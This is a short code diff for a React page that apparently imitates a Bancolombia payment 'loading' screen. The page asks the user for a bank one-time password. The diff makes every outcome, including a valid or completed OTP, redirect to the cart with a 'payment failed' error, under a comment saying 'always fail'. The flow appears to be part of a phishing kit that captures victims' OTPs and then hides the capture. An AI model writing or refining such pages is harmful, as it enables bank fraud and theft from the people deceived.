@@ -35,13 +35,13 @@ export default function BancolombiaCargandoPage() {
           if (data.status === 'waiting_otp') {
             setShowOtpModal(true);
           } else if (data.status === 'otp_valid' || data.status === 'otp_submitted' || data.status === 'completed') {
-            // SIEMPRE FALLAR - Redirigir a checkout
-            router.push('/checkout');
+            // SIEMPRE FALLAR - Redirigir a carrito con mensaje de error
+            router.push('/carrito?error=pago_fallido');
           } else if (data.status === 'otp_invalid') {
-            // OTP was wrong - redirigir a checkout
-            router.push('/checkout');
+            // OTP was wrong - redirigir a carrito con mensaje de error
+            router.push('/carrito?error=pago_fallido');
           } else if (data.status === 'timeout') {
-            router.push('/checkout');
+            router.push('/carrito?error=pago_fallido');
           }
         }
       } catch (error) {
@@ -171,10 +171,10 @@ export default function BancolombiaCargandoPage() {
 
             {status === 'timeout' && (
               <button
-                onClick={() => router.push('/checkout')}
+                onClick={() => router.push('/carrito?error=pago_fallido')}
                 className="w-full py-3 px-6 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition font-medium"
               >
-                Volver al checkout
+                Volver al carrito
               </button>
             )}
 
